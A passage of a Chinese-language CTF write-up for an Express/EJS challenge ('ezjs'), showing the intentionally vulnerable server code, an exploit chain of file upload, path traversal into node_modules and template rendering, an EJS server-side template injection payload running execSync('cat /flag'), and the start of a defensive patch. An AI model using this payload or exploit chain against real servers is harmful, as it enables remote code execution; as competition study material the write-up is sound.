        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> storage <span class="token operator">=</span> multer<span class="token punctuation">.</span><span class="token function">diskStorage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token function-variable function">destination</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置上传文件的目标目录</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token function-variable function">filename</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 直接使用原始文件名</span>
        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 配置 multer 上传中间件</span>
<span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// 使用自定义存储选项</span>
    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span>
            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 允许上传其他类型的文件</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

admin<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string-property property">"username"</span><span class="token operator">:</span><span class="token string">"ADMIN"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span>
<span class="token punctuation">&#125;</span>
app<span class="token operator">=</span><span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParse<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token string">'Can_U_hack_me?'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token literal-property property">cookie</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">maxAge</span><span class="token operator">:</span> <span class="token number">3600</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'you can not be admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">const</span> new_username <span class="token operator">=</span> username<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>new_username <span class="token operator">===</span> admin<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> admin<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token string">"ADMIN"</span><span class="token punctuation">;</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// res.redirect('/login');</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> upload<span class="token punctuation">.</span><span class="token function">single</span><span class="token punctuation">(</span><span class="token string">'fileInput'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No file uploaded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File uploaded successfully: '</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/render'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Filename parameter is required'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>filePath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file type.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">,</span>IfLogin<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">!==</span> <span class="token string">'ADMIN'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Access forbidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> oldPath <span class="token punctuation">,</span> newPath <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldPath <span class="token operator">||</span> <span class="token operator">!</span>newPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Missing oldPath or newPath'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">const</span> new_file <span class="token operator">=</span> newPath<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> oldFilePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> oldPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> newFilePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> new_file<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>newFilePath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file type.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'oldPath parameter is required'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>oldFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Old file not found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>newFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'New file path already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">createDirectoriesForFilePath</span><span class="token punctuation">(</span>newFilePath<span class="token punctuation">)</span>
    fs<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span>oldFilePath<span class="token punctuation">,</span> newFilePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error renaming file:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error renaming file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File renamed successfully'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'3000'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>package.json</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"express-file-upload-app"</span><span class="token punctuation">,</span>
  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>
  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"ezjs"</span><span class="token punctuation">,</span>
  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>
  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"node app.js"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.2"</span><span class="token punctuation">,</span>
    <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.6"</span><span class="token punctuation">,</span>
    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>
    <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.19.0"</span><span class="token punctuation">,</span>
    <span class="token property">"multer"</span><span class="token operator">:</span> <span class="token string">"^1.4.4"</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ejs v3.1.6，但是看了下<code>render</code>没有参数可控</p>
<p>接下来考虑express引擎解析的漏洞，参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13512">https://xz.aliyun.com/t/13512</a></p>
<p>上传index.js</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112355986.png" alt="image-20240720112355986"></p>
<p>然后目录穿越移动到node_modules下</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112416310.png" alt="image-20240720112416310"></p>
<p>接下来再上传一个.ttt后缀的文件</p>
<p>接下来&#x2F;render路由先渲染1.ttt，再渲染1.ejs即可带出回显</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112540877.png" alt="image-20240720112540877"></p>
<p>然后换一个后缀故技重施即可</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112948693.png" alt="image-20240720112948693"></p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112927334.png" alt="image-20240720112927334"></p>
<hr>
<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>来自<a target="_blank" rel="noopener" href="https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3">https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3</a></p>
<p>.ejs 绕过文件上传</p>
<p>render 传参 .ejs&#x2F;…&#x2F; 绕过 render 检验</p>
<pre class="line-numbers language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%=</span><span class="token language-javascript"> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">%></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>加一下中间件和重命名的路径名称黑名单即可，应该只需要过滤上传js即可，感觉是这么抢血的</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 配置 multer 上传中间件</span>
<span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// 使用自定义存储选项</span>
    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span>
            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.js'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 如果文件后缀为 .js，则拒绝上传该文件</span>
